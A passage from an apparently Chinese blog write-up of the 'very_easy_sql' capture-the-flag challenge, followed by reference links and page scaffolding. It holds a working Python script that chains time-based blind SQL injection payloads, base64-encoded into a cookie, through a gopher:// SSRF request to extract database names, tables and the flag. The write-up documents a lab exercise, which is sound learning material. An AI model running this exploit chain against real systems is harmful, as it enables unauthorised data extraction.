1,2,if(ascii( substr((database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot; #联合查询，ascii编码延时注入猜测库名</span><br> <br>        <span class="hljs-comment"># flag</span><br>        <span class="hljs-comment"># poc=&quot;&#x27;) union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot; #联合查询，猜测文件名</span><br> <br>        poc = <span class="hljs-string">&quot;&#x27;) union select 1,2,if(ascii( substr((select * from flag),&quot;</span> + <span class="hljs-built_in">str</span>(pos) + <span class="hljs-string">&quot;,1) )=&quot;</span> + <span class="hljs-built_in">str</span>(<br>            i) + <span class="hljs-string">&quot;,sleep(2),1) # &quot;</span> <span class="hljs-comment">#读取文件flag中的值</span><br> <br>        bs = <span class="hljs-built_in">str</span>(base64.b64encode(poc.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-comment">#flag的值经过utf-8于base64编码</span><br>        final_poc = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot;</span> + bs + <span class="hljs-string">&quot;%3B%250d%250a&quot;</span> <span class="hljs-comment">#需要解码，内容请参考截图</span><br>        t1 = time.time() <br>        res = requests.get(url + final_poc)<br>        t2 = time.time()<br>        <span class="hljs-keyword">if</span> (t2 - t1 &gt; <span class="hljs-number">2</span>):<span class="hljs-comment">#以上四行为延时注入的时间判断语句，爆破期间如果某字符返回响应的时间较长</span><br>            flag += <span class="hljs-built_in">chr</span>(i) <span class="hljs-comment">#写入字符串flag</span><br>            <span class="hljs-built_in">print</span>(flag) <span class="hljs-comment">#输出flag</span><br>            <span class="hljs-keyword">break</span> <span class="hljs-comment">#进入下一字符的爆破</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
<p>其中 变量<strong>final_poc</strong>经过两次url解码，内容如下所示，将变量<strong>bs</strong>(编码后的变量<strong>poc</strong>)传到服务器~</p>
<p class='item-img' data-src='image-20230821164900296.png'><img src="image-20230821164900296.png" alt="image-20230821164900296"></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2>
<p>剩下的细节就参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43665434/article/details/115255263">gopher协议基础</a></p>
<p>gopher实战1：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/337824.html">gopher协议的利用 - FreeBuf网络安全行业门户</a></p>
<p>gopher实战2：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)</a></p>
<p>SSRF实战1：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞 - Saint_Michael - 博客园 (cnblogs.com)</a></p>
<p>SSRF实战2：<a target="_blank" rel="noopener" href="https://blog.csdn.net/G0mini/article/details/128273166">SSRF深入各种高级实战用法_G0mini的博客-CSDN博客</a></p>
<p>SSRF实战3：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11749367.html">ssrf漏洞利用(内网探测、打redis) - ctrl_TT豆 - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42789937/article/details/128366407?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169260327316800182115044%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169260327316800182115044&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-128366407-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cvery_easy_sql&amp;spm=1018.2226.3001.4187">wp参考1</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanxu8877/article/details/128069145?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169260327316800182115044%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169260327316800182115044&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-128069145-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cvery_easy_sql&amp;spm=1018.2226.3001.4187">wp参考2</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/08/21/Cat/">← 下一篇 攻防世界-Cat</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/08/19/%E5%86%85%E9%83%A8%E7%AB%9E%E8%B5%9B%E9%A2%983/">内部竞赛3 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">题目描述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">题目解题：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text">Gopher协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">参考文章：</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>